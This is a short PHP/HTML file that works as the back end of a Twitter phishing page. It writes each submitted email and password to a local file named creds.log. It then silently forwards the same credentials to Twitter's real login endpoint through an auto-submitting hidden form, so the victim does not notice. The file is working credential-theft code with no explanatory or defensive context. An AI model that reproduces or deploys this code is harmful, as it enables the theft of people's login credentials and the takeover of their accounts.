<html>
<body>
<?php
$fp = fopen("creds.log", "a");
fwrite($fp, "\nTwitter $_POST[email] $_POST[pass]");
fclose($fp);
echo "<form name=\"myform\" method=\"post\" action=\"https://twitter.com/sessions\">";
echo "<input type=\"hidden\" name=\"email\" value=\"$_POST[email]\">";
echo "<input type=\"hidden\" name=\"pass\" value=\"$_POST[pass]\">";
?>
<script language="JavaScript">document.myform.submit();</script>
</form>
</body>
</html>
